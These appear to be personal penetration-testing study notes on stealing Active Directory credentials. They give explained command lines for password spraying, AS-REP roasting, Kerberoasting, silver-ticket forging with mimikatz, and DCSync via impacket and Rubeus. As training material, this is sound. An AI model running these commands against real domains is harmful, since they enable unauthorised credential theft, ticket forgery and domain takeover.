Attacks for stealing NTLM Hashes, Kerberos ticket, any kind of certificates.

* Password Attacks: 
	* Using Mimikatz: Steal hashes and crack hashes. 
	* Using LDAP:
		* [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1): `.\Spray-Passwords.ps1 -Pass <Password> -Admin`
		* Makes authentication requests to active user accounts including admin accounts using System.DirectoryServices .net class's DirectoryEntry method. Script checks password policy for checking lockout threshold and lockout duration.
		* Run it on victim machine.
	* Using SMB:
		* CrackMapExec: `crackmapexec smb <ip> -u <user file> -p <password> -d <domain> --continue-on-success`
		* Can be run from linux attack machine.
		* CrackMapExec can be used to password spray attack on SMB
		* It does NOT check for password policy for checking lockout threshold and lockout duration.
		* Output also checks if the user with valid credentials has admin privileges on the machine.
	* Using Kerberos:
		* [kerbrute](https://github.com/ropnop/kerbrute): `.\kerbrute_windows_amd64.exe passwordspray -d <domain> <user file> "<password>"`
		* Run it on victim machine.
		* Password attack tool, user enumeration tool using Kerberos pre-authentication (stops after AS_REQ response) which is much stealthier.
* AS-REP Roasting: If Kerberos pre-authentication is disabled for an account(s) then AS-REQ requests can be sent on behalf of those accounts to receive a TGT from the AS-REP response. Since the ticket is encrypted with NTLM hash of password it is vulnerable to offline password attack.
	* Search for accounts with pre-authentication disabled and obtain hashes:
		* Using Linux: `impacket-GetNPUsers -dc-ip <domain controller ip>  -request -outputfile <outputfile> <domain>/<user>`
		* Using Windows on target machines: `.\Rubeus.exe asreproast /nowrap`
	* Search for accounts with pre-authentication disabled:
		* Using Linux: `impacket-GetNPUsers -dc-ip <domain controller ip> <domain>/<user>`
		* Using Windows: Use PowerView function `Get-DomainUser` with `PreauthNotRequired` flag.
	* The AS-REP hashes can broken using hashcat with mode `-m 18200` (checked using `hashcat --help | grep -i "Kerberos"`).
	* Targeted AS-REP Roasting: Assuming current account has GenericAll, Generic Write permissions on a target account then the target account UAC value can be changed to not require pre-authentication making it vulnerable to AS-REP Roasting.
* Kerberoasting: A TGS ticket provided by Kerberos to access an SPN is encrypted with the SPN's password NTLM hash which makes it vulnerable to offline password attack.
	* Using Windows: `.\Rubeus.exe kerberoast /outfile:<outfile>`
	* Using Linux: `sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain>/<user> -outputfile <outputfile>`
	* The TGS-REP hashes can broken using hashcat with mode `-m 13100` (checked using `hashcat --help | grep -i "Kerberos"`).
	* The attack is infeasible if the account for the SPN is running on the context of computer account or managed service account or group-managed service account which have a 120 character password. Therefore, is suitable if the account is running on user account context with weak password.
	* Targeted Kerberoasting: Assuming current account has GenericAll, Generic Write permissions on a target machine then the target account can be assigned an SPN making it vulnerable to Kerberoasting.
* Silver Tickets: Forging Kerberos tickets using NTLM hash of service (SPN).
	* Assuming the NTLM hash of SPN was found using methods such as Kerberoasting, then it is possible to use mimikatz and forge Kerberos tickets.
	* Tickets can for forged with any user, user ids, group id values in the ticket.
	* User's domain SID, NTLM hash and SPN of the service are required for forging .
	* Obtaining user Domain SID:
		* Use `whoami /user` and remove the RID (end part of the SID from command output)
	* `SPN` of the service:
		* Use techniques in [[Active Directory Enumeration]] to get SPN.
	* Hash of SPN account password:
		* Using something like Kerberoasting.
	* Forging ticket using mimikatz: `kerberos::golden /sid:<domain SID> /domain:<domain> /ptt /target:<target> /service:<service type> /rc4:<NTLM hash of SPN accound password> /user:<user>`
	* The ticket has been forged. Use `klist` to list Kerberos tickets currently cached in memory.
	* Privileged Account Certificate (PAC): Optional verification process between the SPN application and the domain controller. If enabled, the user authenticating to the service and its privileges are validated by the domain controller.
* Domain Controller Synchronization:
	* Directory Replication services protocol allows one domain controller to communicate another domain controller to update and replicate AD data. 
	* If a user or rather SID has Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights which can be usually found in members of  Domain Admins, Enterprise Admins, and Administrators groups can act as a rogue domain controller to make requests using DRSUAPI to another domain controller and obtain any user credentials from a domain.
	* Using windows:
		* mimikatz: `lsadump::dcsync /user:<domain>\<target user>`
	* Using Linux attack machine:
		* `impacket-secretsdump -just-dc-user <target user> <domain>/<user to use>:'<password>'@<domain controller ip>`
